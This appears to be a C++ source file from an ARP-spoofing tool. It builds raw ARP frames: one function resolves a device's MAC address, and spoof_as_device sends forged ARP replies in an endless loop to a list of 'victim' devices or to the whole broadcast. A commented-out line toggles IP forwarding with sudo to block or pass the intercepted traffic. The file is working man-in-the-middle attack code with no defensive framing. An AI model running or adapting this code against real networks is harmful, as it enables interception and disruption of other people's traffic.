#include "arp_conn_client.h"

#include <iostream>
#include <cstring>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <thread>
#include <netinet/in.h>

using namespace std;

void arp_conn_client::handle_received_event(received_msg msg) {
    message_q.push_back(msg);
}

#define IP4LEN 4
mac_addr arp_conn_client::search_for_mac_addr(std::string priv_ip, mac_addr source_mac, ip4_addr source_ip) {
//    struct mac_addr my_mac = get_my_mac_address("enp0s3");
//    struct ip4_addr my_ip = get_my_priv_ip_addr("enp0s3");

//    struct in_addr my_ip = ((struct sockaddr_in *)&ether_client->my_priv_ip.ifr_addr)->sin_addr;

    struct in_addr target_ip = {0};
    if (!inet_aton(priv_ip.c_str(), &target_ip))
        throw "can't convert device's ip";


#define BUFF_LEN 1024
    char request[BUFF_LEN];
    memset(request, 0, BUFF_LEN);


    // setup arp
    struct ether_arp *arp_header = (struct ether_arp *) request; // arp_header header
    arp_header->arp_hrd = htons(ARPHRD_ETHER); // first arp addr type: mac
    arp_header->arp_pro = htons(ETH_P_IP); // first arp addr type: ip
    arp_header->arp_hln = ETH_ALEN; // len of mac addr
    arp_header->arp_pln = IP4LEN; // len of ip addr
    arp_header->arp_op = htons(ARPOP_REQUEST); // type of arp (request)

    memcpy(arp_header->arp_sha, &source_mac, sizeof(arp_header->arp_sha)); // my spoofed mac addr
    memcpy(arp_header->arp_spa, &source_ip, sizeof(arp_header->arp_spa)); // device ip
//    memset(arp_header->arp_spa, 0, sizeof(arp_header->arp_spa));

    memset(arp_header->arp_tha, 0, sizeof(arp_header->arp_tha));
    memcpy(arp_header->arp_tpa, &target_ip, sizeof(arp_header->arp_tpa));


//#define BUFF_LEN 1024
//    char reply[BUFF_LEN];
    while (true) {

        gateway->next_source_addr.set_next_choice(source_mac);

        // send request
        gateway->next_dest_addr.set_next_choice(BROADCAST_MAC);
        gateway->next_protocol.set_next_choice(htons(ETH_P_ARP));
        gateway->send_data({request, sizeof(ether_arp)});

        using namespace std::chrono_literals;
        std::this_thread::sleep_for(500ms);

        // receive reply
        while (message_q.empty()) {}
        auto reply = message_q.front();
        message_q.pop_front();
        uint8_t *reply_buff = reply.data.get() + reply.curr_offset;

        struct ether_arp *arp_reply = (struct ether_arp *) reply_buff;
        if (ntohs(arp_reply->ea_hdr.ar_op) != ARPOP_REPLY) {
            cout << "received arp not of type reply" << endl;
            continue;
        }

        mac_addr res{};
        memcpy(res.addr, arp_reply->arp_sha, sizeof(res.addr));
        return res;
    }

}

void arp_conn_client::spoof_as_device(std::string target_ip, mac_addr source_mac, std::vector<std::pair<mac_addr, std::string>>& victim_devices) {

//    struct mac_addr src_mac = ether_client->src_mac;
//    struct mac_addr src_mac = get_my_mac_address("enp0s3");
    struct mac_addr src_mac = source_mac;
    struct in_addr device_ip = {0};
    if (!inet_aton(target_ip.c_str(), &device_ip))
        throw "can't convert target_ip's ip";


#define BUFF_LEN 1024
    char buff[BUFF_LEN];
    memset(buff, 0, BUFF_LEN);


    // prepare arp
    struct ether_arp *arp_header = (struct ether_arp *) buff; // arp_header header
    arp_header->arp_hrd = htons(ARPHRD_ETHER); // first arp addr type: mac
    arp_header->arp_pro = htons(ETH_P_IP); // first arp addr type: ip
    arp_header->arp_hln = ETH_ALEN; // len of mac addr
    arp_header->arp_pln = IP4LEN; // len of ip addr
    arp_header->arp_op = htons(ARPOP_REPLY); // type of arp (forged reply)

    memcpy(arp_header->arp_sha, &src_mac, sizeof(arp_header->arp_sha)); // my spoofed mac addr
    memcpy(arp_header->arp_spa, &device_ip, sizeof(arp_header->arp_spa)); // target_ip ip

    // block/allow traffic (linux)
//    if (block_traffic) system("echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward");
//    else system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward");

    while (true) {
        using namespace std::chrono_literals;
        std::this_thread::sleep_for(300ms);

        if (victim_devices.empty()) { // spoof whole broadcast
            memset(arp_header->arp_tha, 0xff, ETH_ALEN);
            memset(arp_header->arp_tpa, 0x00, IP4LEN);

            gateway->next_dest_addr.set_next_choice(BROADCAST_MAC);
            gateway->next_protocol.set_next_choice(htons(ETH_P_ARP));
            gateway->send_data({buff, sizeof(ether_arp)});

        } else { // spoof every victim
            for (pair<mac_addr, string> &victim: victim_devices) {
                mac_addr victim_mac = victim.first;
                struct in_addr victim_ip = {0};
                if (!inet_aton(victim.second.c_str(), &victim_ip))
                    throw "can't convert civtim's ip";

                // send to specific target_ip
                memcpy(arp_header->arp_tha, &victim_mac, sizeof(arp_header->arp_tha));
                memcpy(arp_header->arp_tpa, &victim_ip, sizeof(arp_header->arp_tpa));

                gateway->next_dest_addr.set_next_choice(victim_mac);
                gateway->next_protocol.set_next_choice(htons(ETH_P_ARP));
                gateway->send_data({buff, sizeof(ether_arp)});
            }

        }

        cout << "spoofed frames sent" << endl;
    }

}
